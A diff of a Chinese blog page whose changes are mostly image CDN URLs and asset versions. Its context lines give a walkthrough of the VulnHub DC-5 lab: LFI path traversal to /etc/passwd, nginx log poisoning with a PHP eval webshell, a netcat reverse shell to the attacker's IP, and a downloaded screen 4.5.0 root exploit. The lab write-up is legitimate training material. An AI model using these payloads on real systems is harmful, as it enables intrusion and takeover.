@@ -51,7 +51,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wr0ld.github.io/avatar.png">
 <meta property="article:published_time" content="2026-03-14T04:00:00.000Z">
-<meta property="article:modified_time" content="2026-05-14T10:04:40.421Z">
+<meta property="article:modified_time" content="2026-05-14T13:37:56.011Z">
 <meta property="article:author" content="wr0ld">
 <meta property="article:tag" content="靶机渗透">
 <meta property="article:tag" content="VulnHub">
@@ -67,7 +67,7 @@
   <!-- feed -->
   
 
-  <link rel="stylesheet" href="/css/main.css?v=mp5bt8n4">
+  <link rel="stylesheet" href="/css/main.css?v=mp5jbjbd">
 
 
   
@@ -76,7 +76,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-03-14T12:00:00+08:00","dateModified":"2026-05-14T18:04:40+08:00","datePublished":"2026-03-14T12:00:00+08:00","description":"","headline":"VulnHub DC-5 靶机渗透测试笔记","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/8eb76005/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/8eb76005/","keywords":"靶机渗透, VulnHub, vulnhub-DC, 提权","thumbnailUrl":"/images/VulnHub.jpg","image":1}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-03-14T12:00:00+08:00","dateModified":"2026-05-14T21:37:56+08:00","datePublished":"2026-03-14T12:00:00+08:00","description":"","headline":"VulnHub DC-5 靶机渗透测试笔记","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/8eb76005/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/8eb76005/","keywords":"靶机渗透, VulnHub, vulnhub-DC, 提权","thumbnailUrl":"/images/VulnHub.jpg","image":1}</script>
   
 </head>
 <body><div class="reading-progress-bar"></div>
@@ -133,10 +133,10 @@
 </blockquote>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image1.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image1.png"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.168.0/24</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image2.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image2.png"></p>
 <p>还可以用 <code>arp-scan</code> 扫描，两者对比如下：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
 
@@ -174,7 +174,7 @@
 <td>IP+端口+系统</td>
 </tr>
 </tbody></table>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image3.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image3.png"></p>
 <p><strong>扫描结果</strong></p>
 <ul>
 <li>192.168.168.1 → VM8 网卡</li>
@@ -185,41 +185,41 @@
 </ul>
 <h3 id="1-2-端口与服务扫描"><a href="#1-2-端口与服务扫描" class="headerlink" title="1.2 端口与服务扫描"></a>1.2 端口与服务扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- 192.168.168.169</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image4.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image4.png"></p>
 <ul>
 <li><strong>80</strong> → nginx 1.6.2（主要攻击面）</li>
 <li><strong>111</strong> → rpcbind</li>
 <li><strong>53552</strong> → RPC 状态</li>
 </ul>
 <h3 id="1-3-Web-信息收集"><a href="#1-3-Web-信息收集" class="headerlink" title="1.3 Web 信息收集"></a>1.3 Web 信息收集</h3><p>插件识别：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image5.png"></p>
 <p>只有 Contact 页面有点功能：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image6.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image6.png"></p>
 <hr>
 <h2 id="二、漏洞发现"><a href="#二、漏洞发现" class="headerlink" title="二、漏洞发现"></a>二、漏洞发现</h2><h3 id="2-1-发现文件包含线索"><a href="#2-1-发现文件包含线索" class="headerlink" title="2.1 发现文件包含线索"></a>2.1 发现文件包含线索</h3><p>留言板随便输入，提交后跳转到：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.168.169//thankyou.php?firstname=1&amp;lastname=1&amp;country=canada&amp;subject=1</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image7.png"></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image8.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image7.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image8.png"></p>
 <blockquote>
 <p>一直刷新发现下面的年份会改变</p>
 </blockquote>
 <h3 id="2-2-目录扫描"><a href="#2-2-目录扫描" class="headerlink" title="2.2 目录扫描"></a>2.2 目录扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.168.169/</span><br><span class="line"><span class="comment"># 如果没有安装先执行</span></span><br><span class="line">apt-get install dirsearch</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image9.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image9.png"></p>
 <p>发现 <code>/footer.php</code>，这个页面刷新年份也会变：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.168.169/footer.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image10.png"></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image11.png"></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image12.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image10.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image11.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image12.png"></p>
 <blockquote>
 <p><strong>猜测：</strong> thankyou.php 包含了 footer.php 文件，存在文件包含漏洞。</p>
 </blockquote>
 <h3 id="2-3-验证文件包含漏洞（LFI）"><a href="#2-3-验证文件包含漏洞（LFI）" class="headerlink" title="2.3 验证文件包含漏洞（LFI）"></a>2.3 验证文件包含漏洞（LFI）</h3><p>尝试在 URL 中添加 <code>filename</code> 参数读取系统文件：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;filename=../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image13.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image13.png"></p>
 <p>成功读取！</p>
 <hr>
 <h2 id="三、文件包含漏洞原理"><a href="#三、文件包含漏洞原理" class="headerlink" title="三、文件包含漏洞原理"></a>三、文件包含漏洞原理</h2><blockquote>
@@ -238,21 +238,21 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">../etc/passwd</span><br><span class="line">../../etc/passwd</span><br><span class="line">../../../etc/passwd</span><br><span class="line">../../../../etc/passwd</span><br><span class="line">../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
 
 <p>关于为什么判断是 Linux 系统读取 <code>/etc/passwd</code>，最常用的判断方法就是 Linux 对大小写敏感，Windows 不敏感：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image14.png"></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image15.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image14.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image15.png"></p>
 <hr>
 <h2 id="四、参数爆破确认文件包含参数名"><a href="#四、参数爆破确认文件包含参数名" class="headerlink" title="四、参数爆破确认文件包含参数名"></a>四、参数爆破确认文件包含参数名</h2><p>使用 fuzzDicts 字典爆破参数名：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fuzzDicts-master\paramDict\php.txt</span><br></pre></td></tr></table></figure>
 
 <p>很容易就爆破出来了：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image16.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image16.png"></p>
 <p>参数是 <code>file</code>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image17.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image17.png"></p>
 <p>查看源代码看得更清楚。</p>
 <p>也能用 wfuzz 跑，几乎瞬间出来：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.168.169/thankyou.php?FUZZ=/etc/passwd</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image18.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image18.png"></p>
 <hr>
 <h2 id="五、日志污染-GetShell"><a href="#五、日志污染-GetShell" class="headerlink" title="五、日志污染 GetShell"></a>五、日志污染 GetShell</h2><blockquote>
 <p><strong>思路：</strong> 文件包含不能直接写文件，但 nginx 会把请求记录到日志，日志文件可以被包含执行。</p>
@@ -261,22 +261,22 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/log/nginx/error.log</span><br><span class="line">/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
 
 <p>直接提交会被编码，改用 Burp Suite 提交：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image19.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image19.png"></p>
 <p>在 User-Agent 或请求中传入 PHP 代码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>然后再通过文件包含访问 <code>/var/log/nginx/access.log</code>，可以看到成功执行了：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image20.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image20.png"></p>
 <p>改成 Webshell，用蚁剑连接：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image21.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image21.png"></p>
 <blockquote>
 <p>备注：环境崩了一次，重装了，IP 变成了 170。</p>
 </blockquote>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image22.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image22.png"></p>
 <p>查看 <code>/etc/passwd</code>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image23.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image23.png"></p>
 <hr>
 <h2 id="六、反弹-Shell"><a href="#六、反弹-Shell" class="headerlink" title="六、反弹 Shell"></a>六、反弹 Shell</h2><p>在靶机通过蚁剑执行：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.168.128 5566</span><br><span class="line"><span class="comment"># -e 就是执行的意思</span></span><br></pre></td></tr></table></figure>
@@ -284,25 +284,25 @@
 <p>Kali 监听：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 5566</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image24.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image24.png"></p>
 <p>升级为交互式终端：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image25.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image25.png"></p>
 <p>也没找到特别的用户：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image26.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image26.png"></p>
 <hr>
 <h2 id="七、提权"><a href="#七、提权" class="headerlink" title="七、提权"></a>七、提权</h2><h3 id="7-1-SUID-文件查找"><a href="#7-1-SUID-文件查找" class="headerlink" title="7.1 SUID 文件查找"></a>7.1 SUID 文件查找</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image27.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image27.png"></p>
 <p>找到一个可疑的 <strong>screen 4.5.0</strong>！</p>
 <h3 id="7-2-搜索-Screen-漏洞"><a href="#7-2-搜索-Screen-漏洞" class="headerlink" title="7.2 搜索 Screen 漏洞"></a>7.2 搜索 Screen 漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image28.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image28.png"></p>
 <p>选第一个，找到文件地址：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name 41154.sh</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image29.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image29.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/exploitdb/exploits/linux/local/41154.sh</span><br></pre></td></tr></table></figure>
 
 <h3 id="7-3-传输并执行-Exp"><a href="#7-3-传输并执行-Exp" class="headerlink" title="7.3 传输并执行 Exp"></a>7.3 传输并执行 Exp</h3><p>上传文件有多种方式，可以在 Kali 上用 Python 开个 Web，然后在靶机上直接下载文件，也可以用蚁剑上传。</p>
@@ -312,9 +312,9 @@
 <p>靶机下载并执行：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://192.168.168.128:8888/41154.sh</span><br><span class="line"><span class="built_in">chmod</span> 777 41154.sh</span><br><span class="line">bash 41154.sh</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image30.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image30.png"></p>
 <p>找到 flag：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image31.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image31.png"></p>
 <hr>
 <h2 id="八、渗透流程总结"><a href="#八、渗透流程总结" class="headerlink" title="八、渗透流程总结"></a>八、渗透流程总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">信息收集（nmap + arp-scan）</span><br><span class="line">    ↓</span><br><span class="line">发现 Contact 页面 → 提交表单跳转参数可控</span><br><span class="line">    ↓</span><br><span class="line">目录扫描发现 footer.php → 判断存在文件包含</span><br><span class="line">    ↓</span><br><span class="line">参数爆破确认参数名为 file → LFI 读取 /etc/passwd</span><br><span class="line">    ↓</span><br><span class="line">日志污染写入 PHP 代码 → 文件包含执行日志</span><br><span class="line">    ↓</span><br><span class="line">蚁剑连接 Webshell → 反弹 Shell</span><br><span class="line">    ↓</span><br><span class="line">SUID 查找发现 Screen 4.5.0 → 41154.sh 提权</span><br><span class="line">    ↓</span><br><span class="line">root → flag ✅</span><br></pre></td></tr></table></figure>
 
@@ -817,7 +817,7 @@
 </script>
 
 <!-- required -->
-<script src="/js/main.js?v=mp5bt8n6" defer></script>
+<script src="/js/main.js?v=mp5jbjbe" defer></script>
 
 <script type="text/javascript">
   const applyTheme = (theme) => {
@@ -1081,7 +1081,7 @@
 <script src="/js/plugins/hotkeys.js"></script>
 
 <!-- Achievements / Card System -->
-<script src="/js/plugins/achievements.js?v=mp5bt8n7"></script>
+<script src="/js/plugins/achievements.js?v=mp5jbjbf"></script>
 
 <!-- Special Days - 节日彩蛋系统 -->
 <script src="/js/plugins/special-days.js"></script>
